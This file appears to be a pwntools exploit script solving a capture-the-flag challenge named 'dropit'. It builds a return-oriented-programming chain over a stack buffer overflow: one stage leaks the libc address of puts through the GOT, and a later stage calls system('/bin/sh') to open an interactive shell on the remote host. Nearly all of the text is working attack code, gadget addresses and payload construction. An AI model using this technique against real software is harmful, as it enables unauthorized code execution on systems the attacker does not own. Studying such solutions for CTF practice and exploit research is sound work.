from pwn import *
from struct import *

_remote=1
_debug=0
_gdb=0

prog="./dropit"
elf_prog=ELF(prog)

if _remote:
	proc=remote("challenges.ctfd.io",30261)
	libc=ELF("./libc6_2.32-0ubuntu3_amd64.so")
else:
	proc=process(prog)
	#ldd dropit <-- to check the libc in your environment
	libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


if _gdb and _debug and _remote==0:
	gdb.attach(proc, '''
	set pagination off
	set disassembly-flavor intel
	define hook-stop
	echo ****************************************************\\n
	echo ====================info register===================\\n
	info register
	echo ================32 word hex of RSP==================\\n
	x/32gx $rsp
	echo ================next 5 instruction==================\\n
	x/5i $rip
	echo ================16 word hex of RBP==================\\n
	x/16gx $rbp
	echo ****************************************************\\n
	end
	'''+
	# break piont at main
	'''b*0x0000000000401146
	'''+ 
	# break piont after fgets
	'''b*0x000000000040118e"
	'''+
	'''continue	
	''')

#GOT address of puts@libc
got_puts=elf_prog.got['puts']
#GOT address of fgets@libc
got_fgets=elf_prog.got['fgets']
#GOT address of setvbuf@libc
got_setvbuf=elf_prog.got['setvbuf']

#address of main and ret
addr_main=elf_prog.symbols['main']
addr_ret=0x401194

#PLT address of put@plt
plt_puts= elf_prog.plt['puts']


# ROPgadget --binary dropit --only "pop|ret"
#0x0000000000401203 : pop rdi ; ret
pop_rdi_ret=0x0000000000401203

#################################################################
##
## payload 1 for libc addresss leaking
##
## construct ROP puts(got_puts) => print the address of puts@libc
##
#################################################################
payload  = ""
payload += "A"*(3*4*4+8) # padding to RBP of main
payload += pack("Q",pop_rdi_ret)
payload += pack("Q",got_puts)
payload += pack("Q",plt_puts) # puts(got_puts)
payload += pack("Q",addr_main) # go back to main for continues exploit

proc.sendlineafter('?\n',payload)

## extract the leaked address from the reply and convert to int for further operation
raw_byte= proc.recvline()
libc_puts=unpack("Q",raw_byte[:-1].ljust(8, '\x00'))[0]



## additional debug part for more address leaking
if _debug:
	payload2  = ""
	payload2 += "A"*(3*4*4+8) # padding to RBP of main
	payload2 += pack("Q",pop_rdi_ret)
	payload2 += pack("Q",got_fgets)
	payload2 += pack("Q",plt_puts) # puts(got_fgets)
	payload2 += pack("Q",addr_main) # go back to main for continues exploit

	proc.sendlineafter('?\n',payload2)

	raw_byte= proc.recvline()
	libc_fgets=unpack("Q",raw_byte[:-1].ljust(8, '\x00'))[0]


	payload3  = ""
	payload3 += "A"*(3*4*4+8) # padding to RBP of main
	payload3 += pack("Q",pop_rdi_ret)
	payload3 += pack("Q",got_setvbuf)
	payload3 += pack("Q",plt_puts) # puts(got_setvbuf)
	payload3 += pack("Q",addr_main) # go back to main for continues exploit

	proc.sendlineafter('?\n',payload3)

	raw_byte= proc.recvline()
	libc_setvbuf=unpack("Q",raw_byte[:-1].ljust(8, '\x00'))[0]


# caluelate the base address of libc
libc_base=libc_puts-libc.symbols['puts']
# caluelate the system() address of libc
libc_system=libc_base+libc.symbols['system']
# caluelate the '/bin/sh' address of libc
libc_binsh=libc_base+libc.search('/bin/sh').next()


## additional debug info printing
if _debug:
	print "libc_puts="+hex(libc_puts)
	print "libc_fgets="+hex(libc_fgets)
	print "libc_setvbuf="+hex(libc_setvbuf)
	print "libc_binsh="+hex(libc_binsh)
	print "libc_system="+hex(libc_system)
    	print "libc.symbols['puts']="+hex(libc.symbols['puts'])
	print "libc.symbols['system']="+hex(libc.symbols['system'])
	print "libc.search('/bin/sh').next()="+hex(libc.search('/bin/sh').next())

#################################################################
##
## payload 2 for get intetactive shell
##
## construct ROP system('/bin/sh') => print the address of puts@libc
##
#################################################################
payload4  = ""
payload4 += "A"*(3*4*4+8) # padding to RBP of main
# return and align the RSP, due to this libc6_2.23 will check the alignment of RSP
# <do_system+1094>: movaps XMMWORD PTR [rsp+0x40],xmm0
payload4 += pack("Q",addr_ret) 
payload4 += pack("Q",pop_rdi_ret)
payload4 += pack("Q",libc_binsh)
payload4 += pack("Q",libc_system) # system@libc('/bin/sh'@libc)
	
proc.sendlineafter('?\n',payload4)

proc.interactive()
